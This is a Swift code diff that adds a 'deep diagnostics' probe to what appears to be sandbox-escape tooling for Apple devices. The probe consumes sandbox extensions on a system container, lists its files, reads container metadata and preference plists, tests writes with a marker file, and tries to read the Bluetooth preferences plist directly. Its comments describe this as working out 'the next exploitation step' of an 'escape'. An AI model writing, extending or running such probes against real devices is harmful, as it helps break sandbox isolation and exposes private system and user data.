@@ -393,6 +393,102 @@ final class A2DPProbe: ObservableObject {
         return hits
     }
 
+    // MARK: - Deep diagnostics
+
+    /// Ground-truth access probe on one container: what exactly does a
+    /// consumed extension allow? errno values make the next exploitation step
+    /// decidable instead of guessed.
+    func runDiagnostics() {
+        guard !running else { return }
+        running = true
+        log = ""
+        findings = []
+        append("Deep diagnostics: single-container access probe")
+        Task { [weak self] in
+            guard let self else { return }
+            let found = await self.enumerate(root: .systemData)
+            guard let container = found.first else {
+                self.append("no container to diagnose")
+                self.running = false
+                return
+            }
+            self.diagnose(container)
+            self.running = false
+        }
+    }
+
+    private func diagnose(_ path: String) {
+        append("target: \(path)")
+        var st = stat()
+        if lstat(path, &st) == 0 {
+            append("lstat ok: mode=\(String(st.st_mode, radix: 8)) uid=\(st.st_uid)")
+        } else {
+            append("lstat failed errno=\(errno)")
+        }
+
+        let handle = consumeFor(path)
+        guard handle > 0 else {
+            append("no extension handle — nothing further to test")
+            return
+        }
+        defer { SandboxExtensionRelease(handle) }
+
+        if let entries = try? FileManager.default.contentsOfDirectory(atPath: path) {
+            append("listing ok: \(entries.count) entries")
+            for entry in entries.prefix(15) {
+                append("  . \(entry)")
+            }
+        } else {
+            append("listing FAILED errno=\(errno)")
+        }
+
+        var buf = [CChar](repeating: 0, count: 512)
+        let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
+        if len > 0 {
+            append("xattr ok: \(String(cString: buf))")
+        } else {
+            append("xattr failed len=\(len) errno=\(errno) (93=ENOATTR 13=EACCES 1=EPERM)")
+        }
+
+        let meta = path + "/.com.apple.containermanagerd.metadata.plist"
+        diagnoseOpen(meta, label: "metadata plist")
+
+        let gp = path + "/Library/Preferences/.GlobalPreferences.plist"
+        diagnoseOpen(gp, label: "GlobalPreferences")
+
+        let marker = path + "/.bfw_" + String(UUID().uuidString.prefix(8))
+        if FileManager.default.createFile(atPath: marker, contents: Data("x".utf8)) {
+            try? FileManager.default.removeItem(atPath: marker)
+            append("WRITE OK inside container (marker created+removed)")
+        } else {
+            append("write refused inside container")
+        }
+
+        // Direct-file extension: the escape can also target a file path.
+        let prefTarget = path + "/Library/Preferences/com.apple.bluetooth.plist"
+        let fileHandle = consumeFor(prefTarget)
+        if fileHandle > 0 {
+            let readable = (try? Data(contentsOf: URL(fileURLWithPath: prefTarget))) != nil
+            append("direct-file extension for bluetooth.plist: handle ok, readable=\(readable)")
+            SandboxExtensionRelease(fileHandle)
+        } else {
+            append("direct-file extension for bluetooth.plist: refused (see log above)")
+        }
+    }
+
+    private func diagnoseOpen(_ path: String, label: String) {
+        let fd = open(path, O_RDONLY)
+        if fd >= 0 {
+            var tmp = stat()
+            var size: Int64 = 0
+            if fstat(fd, &tmp) == 0 { size = Int64(tmp.st_size) }
+            close(fd)
+            append("\(label) open ok: \(size) bytes")
+        } else {
+            append("\(label) open failed errno=\(errno) (2=ENOENT 13=EACCES 1=EPERM)")
+        }
+    }
+
     /// List a directory under an extension (full names, no decoration).
     func listDir(_ target: String) -> [String] {
         let handle = consumeFor(target)
